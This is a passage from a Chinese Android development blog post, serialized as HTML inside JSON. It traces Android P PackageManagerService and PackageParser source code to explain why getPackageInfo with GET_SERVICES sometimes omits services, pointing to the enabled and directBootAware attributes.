class=\"keyword\">return</span> getPackageInfoInternal(packageName, PackageManager.VERSION_CODE_HIGHEST,</span><br><span class=\"line\">            flags, Binder.getCallingUid(), userId);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 实际的内部方法，这里做了代码精简，只保留关键部分</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> PackageInfo <span class=\"title function_\">getPackageInfoInternal</span><span class=\"params\">(String packageName, <span class=\"type\">long</span> versionCode,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"type\">int</span> flags, <span class=\"type\">int</span> filterCallingUid, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// reader</span></span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mPackages) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Normalize package name to handle renamed packages and static libs</span></span><br><span class=\"line\">        packageName = resolveInternalPackageNameLPr(packageName, versionCode);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"variable\">matchFactoryOnly</span> <span class=\"operator\">=</span> (flags &amp; MATCH_FACTORY_ONLY) != <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (matchFactoryOnly) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">final</span> <span class=\"type\">PackageSetting</span> <span class=\"variable\">ps</span> <span class=\"operator\">=</span> mSettings.getDisabledSystemPkgLPr(packageName);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (ps != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// ...</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> generatePackageInfo(ps, flags, userId); <span class=\"comment\">// 生成PackageInfo实例</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        PackageParser.<span class=\"type\">Package</span> <span class=\"variable\">p</span> <span class=\"operator\">=</span> mPackages.get(packageName);</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!matchFactoryOnly &amp;&amp; (flags &amp; MATCH_KNOWN_PACKAGES) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">final</span> <span class=\"type\">PackageSetting</span> <span class=\"variable\">ps</span> <span class=\"operator\">=</span> mSettings.mPackages.get(packageName);</span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> generatePackageInfo(ps, flags, userId); <span class=\"comment\">// 生成PackageInfo实例</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>从getPackageInfoInternal方法的源码来看还只是一些权限校验和匹配，没有涉及到具体组件信息生成的逻辑，所以我们继续看generatePackageInfo方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> PackageInfo <span class=\"title function_\">generatePackageInfo</span><span class=\"params\">(PackageSetting ps, <span class=\"type\">int</span> flags, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (p != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"type\">PackageInfo</span> <span class=\"variable\">packageInfo</span> <span class=\"operator\">=</span> PackageParser.generatePackageInfo(p, gids, flags,</span><br><span class=\"line\">                ps.firstInstallTime, ps.lastUpdateTime, permissions, state, userId);</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> packageInfo;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br></pre></td></tr></table></figure>\n\n<p>同样地，我们只保留关键代码，可以看到生成PackageInfo的过程实际上是由PackageParser来处理。而且，到这里flags都还没解析判断呢，系统怎么知道我需要获取的是什么组件呢是吧？没错，最终逻辑基本都在PackageParser的相关方法里了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> PackageInfo <span class=\"title function_\">generatePackageInfo</span><span class=\"params\">(PackageParser.Package p,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"type\">int</span> gids[], <span class=\"type\">int</span> flags, <span class=\"type\">long</span> firstInstallTime, <span class=\"type\">long</span> lastUpdateTime,</span></span><br><span class=\"line\"><span class=\"params\">        Set&lt;String&gt; grantedPermissions, PackageUserState state, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"type\">PackageInfo</span> <span class=\"variable\">pi</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PackageInfo</span>();</span><br><span class=\"line\">    pi.packageName = p.packageName;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((flags &amp; PackageManager.GET_SERVICES) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 这里的N就等于Manifest文件中实际声明的Service的数量</span></span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">N</span> <span class=\"operator\">=</span> p.services.size();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (N &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">num</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">final</span> ServiceInfo[] res = <span class=\"keyword\">new</span> <span class=\"title class_\">ServiceInfo</span>[N];</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; N; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">final</span> <span class=\"type\">Service</span> <span class=\"variable\">s</span> <span class=\"operator\">=</span> p.services.get(i);</span><br><span class=\"line\">                <span class=\"comment\">// 关键就在这个判断，决定了哪些Service组件会被过滤掉</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (state.isMatch(s.info, flags)) &#123;</span><br><span class=\"line\">                    res[num++] = generateServiceInfo(s, flags, state, userId);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// 由于返回的数组长度并不一定等于N，所以还需要专门trim一下数组</span></span><br><span class=\"line\">            pi.services = ArrayUtils.trimToSize(res, num);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> pi;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>总算是找到老巢了，可以看到，最终返回的是pi对象，和传进来的p是不一样的。相关逻辑也很简单，从我的源码注释里可得知ServiceInfo数组之所以会发生变化，就是因为那个 <strong>isMatch</strong> 方法，如果它返回了false，那么这个Service组件不会返回给外部了。<br>继续深入，找到这个PackageUserState的isMatch方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Test if the given component is considered installed, enabled and a match</span></span><br><span class=\"line\"><span class=\"comment\"> * for the given flags.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;p&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> * Expects at least one of &#123;<span class=\"doctag\">@link</span> PackageManager#MATCH_DIRECT_BOOT_AWARE&#125; and</span></span><br><span class=\"line\"><span class=\"comment\"> * &#123;<span class=\"doctag\">@link</span> PackageManager#MATCH_DIRECT_BOOT_UNAWARE&#125; are specified in &#123;<span class=\"doctag\">@code</span> flags&#125;.</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isMatch</span><span class=\"params\">(ComponentInfo componentInfo, <span class=\"type\">int</span> flags)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"variable\">isSystemApp</span> <span class=\"operator\">=</span> componentInfo.applicationInfo.isSystemApp();</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"variable\">matchUninstalled</span> <span class=\"operator\">=</span> (flags &amp; PackageManager.MATCH_KNOWN_PACKAGES) != <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!isAvailable(flags)</span><br><span class=\"line\">            &amp;&amp; !(isSystemApp &amp;&amp; matchUninstalled)) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!isEnabled(componentInfo, flags)) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>; <span class=\"comment\">// 重点关注</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((flags &amp; MATCH_SYSTEM_ONLY) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!isSystemApp) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"variable\">matchesUnaware</span> <span class=\"operator\">=</span> ((flags &amp; MATCH_DIRECT_BOOT_UNAWARE) != <span class=\"number\">0</span>)</span><br><span class=\"line\">            &amp;&amp; !componentInfo.directBootAware;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"variable\">matchesAware</span> <span class=\"operator\">=</span> ((flags &amp; MATCH_DIRECT_BOOT_AWARE) != <span class=\"number\">0</span>)</span><br><span class=\"line\">            &amp;&amp; componentInfo.directBootAware;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> matchesUnaware || matchesAware; <span class=\"comment\">// 重点关注</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>哟，瞧瞧，这限制真的不少啊。对于三方非系统应用来说，我们暂时只用关心两个return分支。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>从上述的isMatch源码来分析问题排查办法。</p>\n<p>第一个即isEnabled的检查，这个我们可以对应Service组件中的 <code>android:enabled</code> 属性，也就是说当你的组件被禁用时，那么对应Service的ServiceInfo就不会返回给外部了，这个很好理解，组件不可用时，外部肯定不能获取其信息，所以你要去bindService之类的操作肯定是抛异常的。当然，此属性默认值是true，但我们不排除业务逻辑中有动态设置false的可能，这个具体参考PackageManager的<strong>setComponentEnabledSetting</strong>方法，此处不赘述。</p>\n<p>第二个即组件<strong>direct-boot</strong>（直接启动模式）的相关设置，这是从7.1之后出现的特性，对应 <code>android:directBootAware</code> 属性，该属性默认是false，即不支持该模式，那么很可能你的应用在设备加密锁屏后获取不到所需要的Service组件。可将<strong>directBootAware</strong>属性设为<strong>true</strong>后再尝试是否能解决本文问题，若涉及到Context的，还需要额外操作，具体参考谷歌官方文档中对直接启动模式的详细介绍和适配方式：<a href=\"https://developer.android.com/training/articles/direct-boot.html\">https://developer.android.com/training/articles/direct-boot.html</a>。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>今天有朋友遇到个问题，说bindService失败了，查了几步发现是由于PackageManager获取不到对应的Service组件导致的。具体示例代码如下：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">val</span> serviceInfos = packageManager.getPackageInfo(<span class=\"string\">&quot;com.xxx.xxx&quot;</span>, PackageManager.GET_SERVICES).services</span><br><span class=\"line\">Log.d(<span class=\"string\">&quot;TEST&quot;</span>, Arrays.toString(serviceInfos))</span><br></pre></td></tr></table></figure>\n\n<p>这里我们通过PackageManager获取到对应包名的PackageInfo，最终的serviceInfos是一个数组，包含<strong>该应用注册的所有Service组件</strong>。<br>但不同时候打印出来的数组长度竟然不同，也就是说某些Service一会儿有一会儿没有，这是为什么呢？</p>\n<h3 id=\"溯源\"><a href=\"#溯源\" class=\"headerlink\" title=\"溯源\"></a>溯源</h3><p>要搞清楚上面的问题，我们就要追本溯源啦！<strong>在追踪的过程中我们时刻记得留意一切可能使services数组发生变化的逻辑</strong>。</p>\n<blockquote>\n<p>提示：以下Android系统源码均基于Android P。</p>\n</blockquote>\n<p>先看看PackageInfo的源码中对services成员的注释描述：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Array of all &#123;<span class=\"doctag\">@link</span> android.R.styleable#AndroidManifestService</span></span><br><span class=\"line\"><span class=\"comment\"> * &amp;lt;service&amp;gt;&#125; tags included under &amp;lt;application&amp;gt;,</span></span><br><span class=\"line\"><span class=\"comment\"> * or null if there were none.  This is only filled in if the flag</span></span><br><span class=\"line\"><span class=\"comment\"> * &#123;<span class=\"doctag\">@link</span> PackageManager#GET_SERVICES&#125; was set.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> ServiceInfo[] services;</span><br></pre></td></tr></table></figure>\n\n<p>可以看出，这里只提到了该数组包含AndroidManifest.xml中注册的所有Service组件，并没有说明有何具体过滤限制。那我们就只能从services赋值的源头找寻了。</p>\n<p>PackageManager只是一层API，我们需要看它对应的系统服务，那么就是PackageManagerService，getPackageInfo相关方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> PackageInfo <span class=\"title function_\">getPackageInfo</span><span class=\"params\">(String packageName, <span class=\"type\">int</span> flags, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> getPackageInfoInternal(packageName, PackageManager.VERSION_CODE_HIGHEST,</span><br><span class=\"line\">            flags, Binder.getCallingUid(), userId);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 实际的内部方法，这里做了代码精简，只保留关键部分</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> PackageInfo <span class=\"title function_\">getPackageInfoInternal</span><span class=\"params\">(String packageName, <span class=\"type\">long</span> versionCode,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"type\">int</span> flags, <span class=\"type\">int</span> filterCallingUid, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// reader</span></span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mPackages) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Normalize package name to handle renamed packages and static libs</span></span><br><span class=\"line\">        packageName = resolveInternalPackageNameLPr(packageName, versionCode);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"variable\">matchFactoryOnly</span> <span class=\"operator\">=</span> (flags &amp; MATCH_FACTORY_ONLY) != <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (matchFactoryOnly) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">final</span> <span class=\"type\">PackageSetting</span> <span class=\"variable\">ps</span> <span class=\"operator\">=</span> mSettings.getDisabledSystemPkgLPr(packageName);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (ps != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// ...</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> generatePackageInfo(ps, flags, userId); <span class=\"comment\">// 生成PackageInfo实例</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        PackageParser.<span class=\"type\">Package</span> <span class=\"variable\">p</span> <span class=\"operator\">=</span> mPackages.get(packageName);</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!matchFactoryOnly &amp;&amp; (flags &amp; MATCH_KNOWN_PACKAGES) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">final</span> <span class=\"type\">PackageSetting</span> <span class=\"variable\">ps</span> <span class=\"operator\">=</span> mSettings.mPackages.get(packageName);</span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> generatePackageInfo(ps, flags, userId); <span class=\"comment\">// 生成PackageInfo实例</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>从getPackageInfoInternal方法的源码来看还只是一些权限校验和匹配，没有涉及到具体组件信息生成的逻辑，所以我们继续看generatePackageInfo方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> PackageInfo <span class=\"title function_\">generatePackageInfo</span><span class=\"params\">(PackageSetting ps, <span class=\"type\">int</span> flags, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (p != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"type\">PackageInfo</span> <span class=\"variable\">packageInfo</span> <span class=\"operator\">=</span> PackageParser.generatePackageInfo(p, gids, flags,</span><br><span class=\"line\">                ps.firstInstallTime, ps.lastUpdateTime, permissions, state, userId);</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> packageInfo;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br></pre></td></tr></table></figure>\n\n<p>同样地，我们只保留关键代码，可以看到生成PackageInfo的过程实际上是由PackageParser来处理。而且，到这里flags都还没解析判断呢，系统怎么知道我需要获取的是什么组件呢是吧？没错，最终逻辑基本都在PackageParser的相关方法里了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> PackageInfo <span class=\"title function_\">generatePackageInfo</span><span class=\"params\">(PackageParser.Package p,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"type\">int</span> gids[], <span class=\"type\">int</span> flags, <span class=\"type\">long</span> firstInstallTime, <span class=\"type\">long</span> lastUpdateTime,</span></span><br><span class=\"line\"><span class=\"params\">        Set&lt;String&gt; grantedPermissions, PackageUserState state, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"type\">PackageInfo</span> <span class=\"variable\">pi</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PackageInfo</span>();</span><br><span class=\"line\">    pi.packageName = p.packageName;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((flags &amp; PackageManager.GET_SERVICES) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 这里的N就等于Manifest文件中实际声明的Service的数量</span></span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">N</span> <span class=\"operator\">=</span> p.services.size();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (N &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">num</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">final</span> ServiceInfo[] res = <span class=\"keyword\">new</span> <span class=\"title class_\">ServiceInfo</span>[N];</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; N; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">final</span> <span class=\"type\">Service</span> <span class=\"variable\">s</span> <span class=\"operator\">=</span> p.services.get(i);</span><br><span class=\"line\">                <span class=\"comment\">// 关键就在这个判断，决定了哪些Service组件会被过滤掉</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (state.isMatch(s.info, flags)) &#123;</span><br><span class=\"line\">                    res[num++] = generateServiceInfo(s, flags, state, userId);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// 由于返回的数组长度并不一定等于N，所以还需要专门trim一下数组</span></span><br><span class=\"line\">            pi.services = ArrayUtils.trimToSize(res, num);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> pi;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>总算是找到老巢了，可以看到，最终返回的是pi对象，和传进来的p是不一样的。相关逻辑也很简单，从我的源码注释里可得知ServiceInfo数组之所以会发生变化，就是因为那个 <strong>isMatch</strong> 方法，如果它返回了false，那么这个Service组件不会返回给外部了。<br>继续深入，找到这个PackageUserState的isMatch方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Test if the given component is considered installed, enabled and a match</span></span><br><span class=\"line\"><span class=\"comment\"> * for the given flags.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;p&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> * Expects at least one of &#123;<span class=\"doctag\">@link</span> PackageManager#MATCH_DIRECT_BOOT_AWARE&#125; and</span></span><br><span class=\"line\"><span class=\"comment\"> * &#123;<span class=\"doctag\">@link</span> PackageManager#MATCH_DIRECT_BOOT_UNAWARE&#125; are specified in &#123;<span class=\"doctag\">@code</span> flags&#125;.</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isMatch</span><span class=\"params\">(ComponentInfo componentInfo, <span class=\"type\">int</span> flags)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"variable\">isSystemApp</span> <span class=\"operator\">=</span> componentInfo.applicationInfo.isSystemApp();</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"variable\">matchUninstalled</span> <span class=\"operator\">=</span> (flags &amp; PackageManager.MATCH_KNOWN_PACKAGES) != <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!isAvailable(flags)</span><br><span class=\"line\">            &amp;&amp; !(isSystemApp &amp;&amp; matchUninstalled)) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!isEnabled(componentInfo, flags)) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>; 